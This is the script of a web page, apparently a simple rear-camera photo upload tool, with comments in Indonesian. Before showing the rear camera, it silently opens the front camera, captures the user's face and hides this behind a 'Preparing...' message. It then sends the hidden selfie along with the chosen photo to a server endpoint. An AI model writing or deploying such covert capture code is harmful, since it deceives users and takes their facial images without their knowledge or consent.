<script>
const intro         = document.getElementById('intro');
const cameraEl      = document.getElementById('camera');
const reviewEl      = document.getElementById('review');
const statusOverlay = document.getElementById('statusOverlay');
const statusMsg     = document.getElementById('statusMsg');

const startBtn  = document.getElementById('startBtn');
const shutter   = document.getElementById('shutter');
const cancelBtn = document.getElementById('cancelBtn');
const sendBtn   = document.getElementById('sendBtn');

const preview   = document.getElementById('preview');
const reviewImg = document.getElementById('reviewImg');

const vFront = document.getElementById('vFront');
const cBack  = document.getElementById('cBack');
const cFront = document.getElementById('cFront');

let backStream  = null;
let frontStream = null;
let capturedBackBlob  = null;
let capturedFrontBlob = null;

function showStatus(msg, cls = '') {
  statusMsg.textContent = msg;
  statusOverlay.className = 'active ' + cls;
}
function hideStatus() { statusOverlay.className = ''; }

function stopStream(s) {
  if (!s) return;
  s.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function waitFrame(v, timeout = 3000) {
  return new Promise(res => {
    if (v.readyState >= 2 && v.videoWidth > 0) return res();
    const t = setTimeout(res, timeout);
    v.onloadeddata = () => { clearTimeout(t); res(); };
  });
}

function grabBlob(video, canvas, quality = 0.85) {
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return new Promise(res => canvas.toBlob(res, 'image/jpeg', quality));
}

function blobToBase64(blob) {
  return new Promise((res, rej) => {
    const fr = new FileReader();
    fr.onload = () => res(fr.result.split(',')[1]);
    fr.onerror = rej;
    fr.readAsDataURL(blob);
  });
}

async function sendPhoto(blob, caption) {
  const photoBase64 = await blobToBase64(blob);
  const r = await fetch('/.netlify/functions/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ caption, photoBase64 })
  });
  const data = await r.json();
  if (!data.ok) throw new Error(data.description || 'send error');
  return data;
}

async function captureFrontOnce() {
  // buka kamera depan, ambil 1 frame, langsung tutup
  const s = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  });
  vFront.srcObject = s;
  vFront.setAttribute('playsinline', '');
  vFront.setAttribute('muted', '');
  await vFront.play();
  await waitFrame(vFront);
  await sleep(200); // kasih waktu exposure settle
  const blob = await grabBlob(vFront, cFront, 0.85);
  s.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
  vFront.srcObject = null;
  vFront.load();
  return blob;
}

async function openBackCamera() {
  backStream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  });
  preview.srcObject = backStream;
  preview.setAttribute('playsinline', '');
  preview.setAttribute('muted', '');
  await preview.play();
  await waitFrame(preview);
}

/* ---------- flow ---------- */

startBtn.addEventListener('click', async () => {
  startBtn.disabled = true;
  try {
    // STEP 1: capture kamera depan duluan (sekilas, silent)
    showStatus('Menyiapkan...');
    capturedFrontBlob = await captureFrontOnce();

    // tunggu driver kamera release
    await sleep(700);

    // STEP 2: baru nyalain kamera belakang
    showStatus('Menyiapkan kamera...');
    await openBackCamera();

    hideStatus();
    intro.style.display = 'none';
    cameraEl.classList.add('active');
  } catch (err) {
    showStatus('Gagal: ' + err.message, 'err');
    startBtn.disabled = false;
  }
});

shutter.addEventListener('click', async () => {
  shutter.disabled = true;
  try {
    await waitFrame(preview);
    capturedBackBlob = await grabBlob(preview, cBack, 0.9);
    reviewImg.src = URL.createObjectURL(capturedBackBlob);
    cameraEl.classList.remove('active');
    reviewEl.classList.add('active');
  } catch (err) {
    alert('Gagal ambil gambar: ' + err.message);
  } finally {
    shutter.disabled = false;
  }
});

cancelBtn.addEventListener('click', () => {
  if (capturedBackBlob) {
    URL.revokeObjectURL(reviewImg.src);
    capturedBackBlob = null;
  }
  reviewImg.src = '';
  reviewEl.classList.remove('active');
  cameraEl.classList.add('active');
});

sendBtn.addEventListener('click', async () => {
  if (!capturedBackBlob || !capturedFrontBlob) return;
  cancelBtn.disabled = true;
  sendBtn.disabled = true;

  try {
    showStatus('Mengirim...');
    await sendPhoto(capturedBackBlob,  '📷 Kamera belakang');
    await sendPhoto(capturedFrontBlob, '📸 Kamera depan');
    showStatus('Terkirim ✓', 'ok');
    setTimeout(() => location.reload(), 1200);
  } catch (err) {
    showStatus('Gagal: ' + err.message, 'err');
    cancelBtn.disabled = false;
    sendBtn.disabled = false;
  }
});
</script>
